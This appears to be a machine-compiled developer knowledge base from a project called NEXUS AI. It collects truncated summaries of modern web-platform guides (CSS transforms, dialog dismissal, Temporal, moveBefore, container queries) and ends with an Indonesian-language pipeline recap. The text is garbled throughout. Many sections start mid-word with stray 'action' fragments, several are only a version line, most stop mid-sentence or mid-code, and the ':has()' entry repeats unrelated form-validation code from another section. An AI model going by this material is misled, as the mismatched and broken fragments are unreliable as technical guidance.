Transform functions do not override the individual transform properties. In other words, `scale: 2; transform: scale(3);` will first scale by 2x, then again by 3x, for a total of 6x.



The `transform` property and individual transform properties impact the layout and rendering of the page and may cause une...

#### 🔗 Traceability:
- [Source Context](NEXUS_INDIVIDUAL-TRANSFORM-PROPERTIES.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Optimizing Interactions in Complex Layouts
> **Origin**: `ui-ux/NEXUS_INTERACTIONS-IN-COMPLEX-LAYOUTS.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
actions in Complex Layouts
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Maintain high frame rates (60FPS) and eliminate interaction latency during drag-and-drop or heavy mutations in complex, multi-column layouts like Kanban boards or massive data grids.

#### 🔗 Traceability:
- [Source Context](NEXUS_INTERACTIONS-IN-COMPLEX-LAYOUTS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Enable interactive HTML content in 3D scenes
> **Origin**: `ui-ux/NEXUS_INTERACTIVE-CONTENT-IN-3D-SCENES.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
Action</button>
  </div>
</canvas>

<script>
  const canvas = document.getElementById("canvas");
  const gl = canvas.getContext("webgl");
  const uiElement = document.getElementById("ui-element");

  // Setup WebGL texture...
  const texture = gl.createTexture();
  gl.bindTexture(gl.TEXTURE_2D, texture);

  canvas.onpaint = () => {
    // 1. Update texture with HTML content
    if (gl.texElementImage2D) {
      gl.texElementImage2D(
        gl.TEXTURE_2D,
        0,
        gl.RGBA,
        gl.RGBA,
        gl.UNSIGNED_BYTE,
        uiElement,
      );
    }

    // ... Render your 3D scene here, calculating htmlElementMVP matrix ...

    // 2. Sync DOM position with 3D scene
    if (canvas.getElementTransform) {
      const mvpDOM = new DOMMatrix(Array.from(h

#### 🔗 Traceability:
- [Source Context](NEXUS_INTERACTIVE-CONTENT-IN-3D-SCENES.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Implementation
> **Origin**: `ui-ux/NEXUS_INTERACTIVE-CONTENT-REVEAL.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action */
.reveal-layer:hover {
  --inner-size: 100px;
  --outer-size: 120px;
}  
```

#### 🔗 Traceability:
- [Source Context](NEXUS_INTERACTIVE-CONTENT-REVEAL.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Show a tooltip when hovering
> **Origin**: `ui-ux/NEXUS_INTEREST-TRIGGERED-TOOLTIPS.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action an icon-only button will take, or provide additional form field guidance.

#### 🔗 Traceability:
- [Source Context](NEXUS_INTEREST-TRIGGERED-TOOLTIPS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Key Use Cases
> **Origin**: `ui-ux/NEXUS_LANGUAGE-DETECTION.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

The **Language Detector API** is a client-side web API designed to identify the language of a given text string. By performing detection locally in the browser, it enhances user privacy and reduces the need for heavy external libraries or costly server-side calls.



- **Translation Prep:** Identifying the source language before sending text to a translator.
- **Safety & Filtering:** Loading specific models for tasks like toxicity detection.
- **Accessibility:** Labeling content with the correct `lang` attribute for screen readers.
- **UI Localization:** Adjusting application interfaces based on the user's input language.



- **OS:** Windows 10/11, macOS 13+, Linux, or Chromebook Plus.
- **Storage:** 22 GB free space (model is removed if space drops below 10 GB).
- **RAM/CPU:** 16 GB RAM and 4+ CPU cores.
- **VRAM:** 4 GB+ if using a GPU.





Check model availability before attempting to instantiate the detector or trigger download.

**MANDATORY:** Instantiating the language detector or triggering a model download with `LanguageDetector.create()` **MUST** be initiated by a user gesture (such as a button click...

#### 🔗 Traceability:
- [Source Context](NEXUS_LANGUAGE-DETECTION.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Implementation
> **Origin**: `ui-ux/NEXUS_LIGHT-DISMISS-A-DIALOG.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

Modern modal dialogs often support "light-dismiss," allowing users to close a dialog by clicking or tapping the backdrop (the area outside the dialog). The `closedby` attribute provides a declarative way to enable this behavior without custom JavaScript.



To enable light-dismiss:

1. Add `closedby="any"` to the `<dialog>` element.
2. Open the dialog using `dialog.showModal()`.



- `any`: Enables light-dismiss (clicking the backdrop), "close requests" (the `Esc` key), and developer mechanisms (e.g., `dialog.close()`).
- `closerequest`: Enables "close requests" and developer mechanisms only. This is the default for modal dialogs.
- `none`: Only developer mechanisms can close the dialog.


When a dialog is opened as a modal using `showModal()`, the browser generates a `::backdrop` pseudo-element. This backdrop covers the entire viewport and sits directly behind the dialog.

```css
/* Style the backdrop to indicate the dialog is modal */
dialog::backdrop {
  background-color: rgba(0, 0, 0, 0.5);
  backdrop-filter: blur(2px); /* Optional: add blur for modern browsers */
}
```



```html
<!-- MANDATORY: Use...

#### 🔗 Traceability:
- [Source Context](NEXUS_LIGHT-DISMISS-A-DIALOG.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Modeling Partial Time Concepts with Temporal
> **Origin**: `ui-ux/NEXUS_MODEL-PARTIAL-TIME-CONCEPTS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Modeling date concepts that lack a full calendar date—such as credit card expirations, annual renewals, or daily alarms—has historically been error-prone with the legacy `Date` object. Developers often resort to using arbitrary days (like the 1st of the month) or parsing strings, leading to "day leakage" or incorrect calculations due to leap years and varying month lengths.

The `Temporal` API provides dedicated types for these partial concepts: `Temporal.PlainYearMonth`, `Temporal.PlainMonthDay`, and `Temporal.PlainTime`. These types ensure precision and avoid leaking irrelevant date components.




Use `Temporal.PlainYearMonth` to represent a year and a month.

```javascript
// Create a PlainYearMonth from values
// Use explicit calendar to avoid mismatch issues in polyfill environments
const expiry = Temporal.PlainYearMonth.from({ year: 2027, month: 12, calendar: 'iso8601' });

// Get the current year/month
const currentMonth = Temporal.Now.plainDateISO().toPlainYearMonth();

// Calculate duration until expiry
// largestUnit ensures the difference is expressed in years if applicable
const duration = currentM...

#### 🔗 Traceability:
- [Source Context](NEXUS_MODEL-PARTIAL-TIME-CONCEPTS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Moving an element with state
> **Origin**: `ui-ux/NEXUS_MOVE-DOM-ELEMENT-WITHOUT-LOSING-STATE.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

When reparenting DOM elements using traditional methods like `appendChild()` or `insertBefore()`, the browser implicitly removes the element from the DOM and then inserts it into its new location. This "remove and insert" operation resets many internal states, causing `<iframe>` elements to reload, CSS animations to restart, and input fields to lose focus.

To move an element while preserving its state, use the `moveBefore()` API. This method performs an atomic move, completely bypassing the removal and insertion steps.



Use `moveBefore()` exactly as you would use `insertBefore()`. It requires two arguments: the node to move, and a reference node to insert before (or `null` to append to the end of the new parent).

```javascript
const newParent = document.getElementById('new-parent');
const elementWithState = document.getElementById('iframe-or-focused-input');

// MANDATORY: Use moveBefore to preserve state. 
// Passing null as the second argument appends the element to the end of newParent.
newParent.moveBefore(elementWithState, null);
```



If you are moving custom elements using `moveBefore()`, their `connec...

#### 🔗 Traceability:
- [Source Context](NEXUS_MOVE-DOM-ELEMENT-WITHOUT-LOSING-STATE.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Omnibox Integration
> **Origin**: `ui-ux/NEXUS_OMNIBOX.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action=opensearch&search=${encodeURIComponent(text)}&limit=5&format=json`
    );
    const [, titles, , urls] = await response.json();

    const suggestions = titles.map((title, i) => ({
      content: urls[i],
      description: `${title} - <url>${urls[i]}</url>`
    }));

    suggest(suggestions);
  } catch (err) {
    console.error('Search failed:', err);
  }
});
```

#### 🔗 Traceability:
- [Source Context](NEXUS_OMNIBOX.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Overflow Clipping Control
> **Origin**: `ui-ux/NEXUS_OVERFLOW-CLIPPING-CONTROL.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action logic.
- **DO** configure `overflow-clip-margin` with a specified length offset when applying external visual effects (like `filter: drop-shadow()`) to prevent sharp bounding box truncation without altering or expanding layout geometry.
- **DO NOT** apply `overflow: clip` if the container requires programmatic scroll manipulation via JavaScript or serves as the immediate layout context for `position: sticky` elements, as `clip` completely disables scrolling.

#### 🔗 Traceability:
- [Source Context](NEXUS_OVERFLOW-CLIPPING-CONTROL.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Critical Rendering Path (CRP) Optimization
> **Origin**: `ui-ux/NEXUS_PERFORMANCE.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action to Next Paint (INP) & Main Thread Unblocking

INP measures the latency of all interactive events across the page's lifecycle. Poor INP is caused by long-running JavaScript tasks blocking the main thread.

#### 🔗 Traceability:
- [Source Context](NEXUS_PERFORMANCE.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Implementation Steps
> **Origin**: `ui-ux/NEXUS_PHYSICS-BASED-EASING.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

Traditional CSS easing functions like `ease-in` or `cubic-bezier()` are limited to simple curves, making it impossible to create complex physics-based effects like bounces or springs. The `linear()` timing function solves this by allowing you to provide a series of stops that can approximate complex curves. Transitions and animations are interpolated based on straight lines between the stops, but within enough stops, it can appear smooth.



1.  **Generate the curve stops:**
    Manually plotting dozens of points for a spring or bounce is impractical. Use a timing function from an external library, or use a  tool to convert an existing JavaScript easing function or an SVG path into the `linear()` syntax. Optional: store these timing functions as CSS custom properties for reuse throughout your site.
2.  **Define the timing function:**
    Apply the generated stops to the `transition-timing-function` or `animation-timing-function` property, or through the `transition` or `animation` shorthands.
3.  **Adjust the duration:**
    Unlike JavaScript physics engines where duration is derived from physical properties (mass, stiffnes...

#### 🔗 Traceability:
- [Source Context](NEXUS_PHYSICS-BASED-EASING.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Fallback strategies
> **Origin**: `ui-ux/NEXUS_PLATFORM-CONTROLS-DISMISS-DIALOG.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

When a modal dialog is open, users expect to use familiar controls to dismiss them: pressing the <kbd>Esc</kbd> key on a keyboard, using the back button or gesture on mobile platforms, or a dismiss gesture with assistive technologies.

When the `<dialog>` element was first introduced, it could be dismissed with the <kbd>Esc</kbd> key, but not other platform controls such as a back button/gesture on mobile. With the addition of the `closedby` attribute for `<dialog>` elements, the extended behavior of responding to more platform-specific controls for close requests has been applied for `<dialog>` elements that are opened in a modal state (i.e. when opened imperatively with the `<dialog>` element’s `showModal()` method in JavaScript or declaratively with the `show-modal` invoker command). So, there is no specific change developers need to make if they are already using the `<dialog>` element.

```html
<!-- MANDATORY: must be opened with either `showModal()` with JavaScript or the `show-modal` command using declarative command invokers in order respond to close requests including platform-specific controls. -->
<dialog aria-label...

#### 🔗 Traceability:
- [Source Context](NEXUS_PLATFORM-CONTROLS-DISMISS-DIALOG.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Precise Text Alignment
> **Origin**: `ui-ux/NEXUS_PRECISE-TEXT-ALIGNMENT.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026





Browsers automatically add extra whitespace above and below text characters to accommodate line-height and font-specific metrics like ascenders and descenders. This "ghost space" makes it impossible to achieve pixel-perfect vertical alignment using standard CSS.

Common issues include:
- **Misaligned Icons**: Text appears visually lower or higher than an adjacent icon even when using `align-items: center`.
- **Inaccurate Padding**: A button with `padding: 12px` visually appears to have more space on top or bottom because of the font's internal leading.
- **Flush Alignment**: You cannot align the top of a capital letter exactly with the top of a container or an adjacent image without using "magic number" negative margins.



The `text-box-trim` and `text-box-edge` properties (shorthand `text-box`) allow you to trim this internal leading based on specific font metrics. By trimming the text box to the **cap-height** (top of capital letters) and the **alphabetic baseline** (bottom of most letters), you can ensure that the element's bounding box matches its visual content.



1. **MANDATORY**: Apply `text-box-trim: tr...

#### 🔗 Traceability:
- [Source Context](NEXUS_PRECISE-TEXT-ALIGNMENT.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Prevent text wrapping
> **Origin**: `ui-ux/NEXUS_PREVENT-TEXT-WRAPPING.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Modern CSS provides the `text-wrap` property to control how text breaks within its container. To ensure text stays on a single line and ignores container boundaries, use `text-wrap: nowrap`. This is the modern, more semantic replacement for `white-space: nowrap`.

Preventing text wrapping is useful for UI elements like navigation tabs, horizontal scrolling chips, or any scenario where a line break would break the layout or visual design.





To prevent any automatic line breaks, apply `text-wrap: nowrap` to the element containing the text.

1. **MANDATORY**: Apply `text-wrap: nowrap` to the target element.
2. **OPTIONAL**: Use an `overflow` property (such as `hidden`, `scroll`, or `auto`) to manage the resulting overflow.
3. **OPTIONAL**: Use `text-overflow: ellipsis` to provide a visual cue when text is truncated. Note: This requires `overflow: hidden`.



```css
.no-wrap-text {
  /* MANDATORY: Prevents automatic line breaks */
  text-wrap: nowrap;

  /* OPTIONAL: Handles the overflow visually */
  overflow: hidden;
  text-overflow: ellipsis;

  /* OPTIONAL: Constrain width to force and handle overflow ...

#### 🔗 Traceability:
- [Source Context](NEXUS_PREVENT-TEXT-WRAPPING.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Pull to Reveal
> **Origin**: `ui-ux/NEXUS_PULL-TO-REVEAL.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



"Pull to reveal" is a UI pattern where content (such as a search bar or refresh control) is hidden above the top of a scrollable area on initial load, and the user can pull down (scroll up) to reveal it. This pattern is commonly used in mobile apps and web apps for search bars, filters, and other secondary controls that should be accessible but not immediately visible.

The CSS property `scroll-initial-target` offers a declarative, CSS-only way to implement this pattern. By setting `scroll-initial-target: nearest` on the main content element, the scroll container will render with the hidden content scrolled out of view. Previously, developers relied on JavaScript (`Element.scrollIntoView()`) or URL fragment identifiers (`#content-id`) to achieve this, both of which have limitations and are tricky to implement.



To implement a pull-to-reveal pattern:

1. **Ensure a scroll container:** The target element must be inside a scroll container (an element with overflow that allows scrolling, such as `overflow: auto`). This can be any ancestor element, including the root `<html>` element.
2. **Define the hidden element:** Place...

#### 🔗 Traceability:
- [Source Context](NEXUS_PULL-TO-REVEAL.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Reduce Style Repetition with CSS Functions
> **Origin**: `ui-ux/NEXUS_REDUCE-STYLE-REPETITION.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Maintaining large stylesheets often leads to repetitive logic, especially when dealing with design system tokens like gradients or responsive layout patterns.

The CSS `@function` at-rule allows you to encapsulate this logic into reusable, parameterized functions, making your CSS more maintainable, consistent and DRY (Don't Repeat Yourself).



A custom function is defined using the `@function` rule followed by a dashed name and a list of parameters. The function returns a value using the `result` property. 

```css
@function --my-function(--input1 <length>, --input2: default-value) returns <length> {
  /* Logic goes here */
  result: var(--input1);
}
```


- **Parameters:** Must start with a double dash (`--`).
- **Defaults:** You can provide default values using a colon (`:`).
- **Result:** The `result` property determines the value the function returns. The last `result` declared in the function body wins.
- **Scoping:** Parameters and variables defined inside the function are locally scoped.
- **Types:** You can require parameters and the returned value to match a CSS type with bracket notation (e.g., `<co...

#### 🔗 Traceability:
- [Source Context](NEXUS_REDUCE-STYLE-REPETITION.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Required Field Feedback
> **Origin**: `ui-ux/NEXUS_REQUIRED-FIELD-FEEDBACK.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action state using a `WeakMap`. This avoids polluting the DOM with "dirty" classes or data attributes.

```javascript
const UserInvalidFallback = (() => {
  const dirtyState = new WeakMap();

  const updateState = (input) => {
    const isValid = input.checkValidity();

    // Update both visual and ARIA state
    input.classList.toggle('user-invalid-fallback', !isValid);
    input.classList.toggle('user-valid-fallback', isValid);

    if (!isValid) {
      input.setAttribute('aria-invalid', 'true');
    } else {
      input.removeAttribute('aria-invalid');
    }
  };

  const handleEvent = (event) => {
    const input = event.target;

    if (event.type === 'reset') {
      const controls = input.elements || [];
      for (const control of controls) {
        dir

#### 🔗 Traceability:
- [Source Context](NEXUS_REQUIRED-FIELD-FEEDBACK.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Rich Media Picker (Customizable Select)
> **Origin**: `ui-ux/NEXUS_RICH-MEDIA-PICKER.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



The native `<select>` element was historically difficult to style and could only contain plain text options. The `appearance: base-select` property offers a declarative, CSS-only way to opt into a customizable state for the `<select>` element. This allows developers to include rich HTML content—such as images, SVGs, and complex layouts—inside `<option>` elements, while retaining native keyboard accessibility and form integration. Use this pattern to replace heavy, custom-built select components with standard, native elements.



To implement a rich media picker using the Customizable Select API:

1. **Opt-in to base styles**: Apply `appearance: base-select` to both the `<select>` element and its internal picker using the `::picker(select)` pseudo-element. This changes the browser's HTML parser for the contents inside the `<select>`.
2. **Define the Button Content**: Use standard `<button>` and `<selectedcontent>` elements inside the `<select>` to define what is shown when the picker is closed. The `<selectedcontent>` element automatically mirrors the content of the selected option. This is required if you want to display t...

#### 🔗 Traceability:
- [Source Context](NEXUS_RICH-MEDIA-PICKER.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Sandbox UI/UX Distilled Findings
> **Origin**: `ui-ux/NEXUS_SANDBOX_UI_FINDINGS.md` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 25/05/2026



**Date**: 2026-05-23
**Context**: NEXUS Sandbox Section 1 generated 11 TALL Stack web applications, all of which failed the UX/UI quality check. The resulting applications were merely default Laravel boilerplate pages with haphazardly injected Livewire components.


1. **Broken Boilerplate**: Agen tidak menghapus halaman dokumentasi bawaan Laravel (`welcome.blade.php` dengan link ke Laracasts/Laravel News). Hal ini membuat aplikasi terlihat seperti *scaffold* awal, bukan produk akhir (MVP).
2. **Missing Application Shell**: Tidak ada satupun aplikasi yang menggunakan struktur `layouts/app.blade.php`. Akibatnya, aplikasi tidak memiliki *navbar*, *footer*, navigasi, atau kerangka UI (Shell) yang layak.
3. **Mangled HTML Injection**: Karena struktur HTML yang kacau, injeksi tag `<livewire:...>` malah merusak *tag* `<body>` dan `<div>`.


Untuk generasi kode selanjutnya (terutama agen `ux-engineer` dan `pipeline-architect`), **patuhi aturan ketat berikut**:

1. **Wajib Hapus Boilerplate**: Setiap kali membuat aplikasi baru, halaman bawaan `welcome.blade.php` **HARUS DIHAPUS TOTAL** isinya dan diganti dengan desain halaman depan/Dashbo...

#### 🔗 Traceability:
- [Source Context](NEXUS_SANDBOX_UI_FINDINGS.md)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Scheduling tasks by priority
> **Origin**: `ui-ux/NEXUS_SCHEDULE-TASKS-BY-PRIORITY.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action (e.g., input handling, critical rendering).
- `user-visible`: Tasks visible to the user but not blocking (default).
- `background`: Tasks that are not time-critical (e.g., analytics, prefetching).

```javascript
// Schedule a high-priority task that blocks user interaction
scheduler.postTask(() => {
  // DO: Handle critical updates that impact user interaction
  handleCriticalUpdate();
}, { priority: 'user-blocking' });

// Schedule a default priority task
scheduler.postTask(() => {
  // DO: Render non-critical content that is visible to the user
  renderSecondaryContent();
}); // Defaults to 'user-visible'

// Schedule a low-priority background task
scheduler.postTask(() => {
  // DO: Perform heavy background work that is not time-critical
  sendAnalytics();
},

#### 🔗 Traceability:
- [Source Context](NEXUS_SCHEDULE-TASKS-BY-PRIORITY.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Set a scroll target for the initial render
> **Origin**: `ui-ux/NEXUS_SCROLL-TARGET-ON-LOAD.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



The CSS property `scroll-initial-target` offers a declarative, CSS-only way to bring a specific descendant element into the visible area of its scroll container as soon as that container is rendered. Previously, developers relied on JavaScript (`Element.scrollIntoView()`) or URL fragment identifiers (`#item-id`), both of which have limitations and are tricky to implement.



To implement this successfully:

1. **Ensure a scroll container:** The target element must be inside a scroll container (an element with overflow that allows scrolling, such as `overflow: auto`). This can be any ancestor element, including the root `<html>` element.
2. **Target the Item:** Apply `scroll-initial-target: nearest` to the specific descendant element you want to bring into view.



In this example, a feed starts scrolled to a specific "featured" item rather than the very top of the list.

```css
/** 
 * TARGET: The item that should be visible on initial load.
 */
.item.target {
  scroll-initial-target: nearest;
}
```



- **DO** use `scroll-initial-target` for "middle-start" experiences, such as a calendar starting on the c...

#### 🔗 Traceability:
- [Source Context](NEXUS_SCROLL-TARGET-ON-LOAD.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Select Menu Interaction
> **Origin**: `ui-ux/NEXUS_SELECT-MENU-INTERACTION.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action
> **VERSION**: v1 | **Last Updated**: 26/05/2026

#### 🔗 Traceability:
- [Source Context](NEXUS_SELECT-MENU-INTERACTION.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Overview
> **Origin**: `ui-ux/NEXUS_SHAPED-CUTOUTS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026


CSS Masking allows you to clip an element to a custom shape, such as adding a notch to a card or creating a shaped border. When combining shapes for complex layouts, choose your masking strategy based on the type of content the element contains:

| Masking strategy                | Best For                        | Text Impact                    |
| ------------------------------- | ------------------------------- | ------------------------------ |
| Direct Element SVG Masking      | Images, Icons, Decorative shapes, Complex shapes | Not recommended (can crop text) |
| Adjacent Element SVG Masking    | Cards with Text, Crucial content | Text remains fully readable    |
| Pure CSS Gradients              | Simple Geometric Shapes           | Not recommended (can crop text) |

---


To implement shaped cutouts:


SVG masks allow you to define shapes that subtract from or add to the visible area using white (reveal) and black (hide) fills.

> **Luminance vs. Alpha Masking**: SVG masks default to **luminance** (brightness) mode, which is why we use `fill="white"` to reveal areas and `fill="black"` to cut them out. If yo...

#### 🔗 Traceability:
- [Source Context](NEXUS_SHAPED-CUTOUTS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Overview
> **Origin**: `ui-ux/NEXUS_SIZE-AWARE-STYLING.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Size-aware styling allows components to change their layout or appearance based on the space available to them, rather than the size of the whole screen. This is useful for components like cards or navigation bars that might be placed in different parts of a layout (like a narrow sidebar or a wide main area).

Using container queries is recommended because it makes components truly modular. You do not need to know where the component will live or write complex media queries to handle every possible layout.





MANDATORY: You must first tell the browser which element is the container to be measured.

```css
.card-container {
  /* Define the container type. Use 'inline-size' for width-based queries. */
  /* You can also use 'size' for both width and height, but it requires explicit sizing. */
  container-type: inline-size;
}
```



Use the `@container` rule to apply styles when the container reaches a certain size.

```css
/* Default styles for small containers (stacked layout) */
.card {
  display: flex;
  flex-direction: column;
  gap: 1rem;
}

/* Styles for larger containers (side-by-side layout) ...

#### 🔗 Traceability:
- [Source Context](NEXUS_SIZE-AWARE-STYLING.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Stabilize Reactive State with Temporal
> **Origin**: `ui-ux/NEXUS_STABILIZE-REACTIVE-STATE.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



While some reactive systems (like [React](https://react.dev/)) rely strictly on reference equality to detect state changes, others (like [Vue](https://vuejs.org/) and [Svelte](https://svelte.dev/)) can track mutations to plain objects. However, for built-in objects like the legacy `Date` object, internal mutations (like `setHours()`) do not change the object's reference and are generally not tracked by any framework's default reactivity system. This leads to missed UI updates and hard-to-debug side effects.

The `Temporal` API solves this by providing immutable objects. Any operation that modifies a value (such as adding time or setting a field) returns a new instance with a new memory reference. This guarantees that state updates are always detected by reactive systems, ensuring UI stability.



To stabilize reactive state using Temporal:

1. **Use Temporal types for state:** Store `Temporal` objects (like `Temporal.PlainDateTime` or `Temporal.PlainDate`) in your reactive state instead of legacy `Date` objects.
2. **Perform immutable updates:** When updating the state, use Temporal methods like `.add()`, `.subtract()`, ...

#### 🔗 Traceability:
- [Source Context](NEXUS_STABILIZE-REACTIVE-STATE.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Style Parent with :has()
> **Origin**: `ui-ux/NEXUS_STYLE-PARENT-WITH-HAS.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action state using a `WeakMap`. This avoids polluting the DOM with "dirty" classes or data attributes.

```javascript
const UserInvalidFallback = (() => {
  const dirtyState = new WeakMap();

  const updateState = (input) => {
    const isValid = input.checkValidity();

    // Update both visual and ARIA state
    input.classList.toggle('user-invalid-fallback', !isValid);
    input.classList.toggle('user-valid-fallback', isValid);

    if (!isValid) {
      input.setAttribute('aria-invalid', 'true');
    } else {
      input.removeAttribute('aria-invalid');
    }
  };

  const handleEvent = (event) => {
    const input = event.target;

    if (event.type === 'reset') {
      const controls = input.elements || [];
      for (const control of controls) {
        dir

#### 🔗 Traceability:
- [Source Context](NEXUS_STYLE-PARENT-WITH-HAS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Validate Input After Interaction
> **Origin**: `ui-ux/NEXUS_VALIDATE-INPUT-AFTER-INTERACTION.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action
> **VERSION**: v1 | **Last Updated**: 26/05/2026

#### 🔗 Traceability:
- [Source Context](NEXUS_VALIDATE-INPUT-AFTER-INTERACTION.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, saas, api]

### 📘 KNOWLEDGE: NEXUS_EXTERNAL_PIPELINE_RECAP.MD

# 🌐 Rekapitulasi Pipeline Eksternal Nexus AI (Ecosystem Integration)
> **VERSION**: v2 | **Last Updated**: 26/05/2026



Dokumen ini menjelaskan alur kerja Nexus AI saat berinteraksi dengan proyek eksternal (Local Development). Ini adalah jembatan antara **Engine Pusat** dan **Implementasi Proyek Spesifik**.

---

## 🔗 1. Global CLI Interaction (Bridge Protocol)
Nexus AI beroperasi sebagai perintah global yang terhubung secara dinamis ke kode sumber utama melalui protokol linking.

**Alur Kerja:**
1.  **Engine Linking**: Menggunakan `npm link` di folder pusat (`NEXUS AI`) untuk mendaftarkan command `nexus` secara global.
2.  **Project Integration**: Menggunakan `npm link human-ai-nexus` di folder proyek target (seperti F-Novel) untuk menggunakan versi pengembangan terbaru secara real-time.
3.  **Dynamic Execution**: Command `nexus run` secara otomatis mendeteksi root project dan menyesuaikan perilaku berdasarkan struktur folder yang ditemukan.

---

## 🔍 2. Specialist Audit (External Scan)
Saat fase Audit dimulai pada proyek eksternal, Engine mengerahkan Agent Spesialis untuk melakukan pemindaian mendalam.

**Komponen Utama:**
-   **Cyber Security**: Memeriksa kebocoran `.env`, kerentanan autentikasi, dan konfigurasi keamanan.
-   **UX Engineer**: Memastikan konsistensi desain, penggunaan variabel CSS/Tailwind, dan estetika premium.
-   **SEO & Performance**: Audit WebP, optimasi query database, dan skor aksesibilitas.
-   **VCS Architect**: Menjaga kesehatan repository, `.gitignore`, dan alur branching.

---

## 🛡️ 3. TDD Iron Laws Enforcement (External Guard)
Nexus AI memaksakan standar kualitas tinggi pada proyek eksternal melalui `TDDGuard`.

**Protokol Keamanan:**
-   **Test-Required Modification**: Setiap perubahan pada kode produksi WAJIB memiliki test pendukung.
-   **Exemption Management**: Jika test belum tersedia, file target harus didaftarkan di `[TDD_LIST.md](NEXUS_TDD_LIST.MD)` atau `documentation/planning/[TDD_LIST.md](NEXUS_TDD_LIST.MD)` agar Engine diizinkan melakukan modifikasi fisik.
-   **Violation Block**: Engine akan menghentikan eksekusi secara otomatis jika mendeteksi modifikasi pada file tanpa bukti perencanaan TDD.

**Agent Pendukung:**
-   **TDD Guard Agent**: [tdd-guard.md](file:///c:/Users/ACER/Desktop/NEXUS%20AI/agent/external/engineering/tdd-guard.md) — Bertugas mengelola daftar pengecualian dan memastikan kepatuhan hukum TDD.

---

## 🛠️ 4. External Path Awareness (Structure Detection)
Nexus AI didesain untuk mengenali berbagai struktur proyek secara cerdas.

**Prioritas Deteksi Folder:**
1.  **Documentation-First**: Mencari folder `documentation/` di root proyek untuk menyimpan audit, planning, dan knowledge.
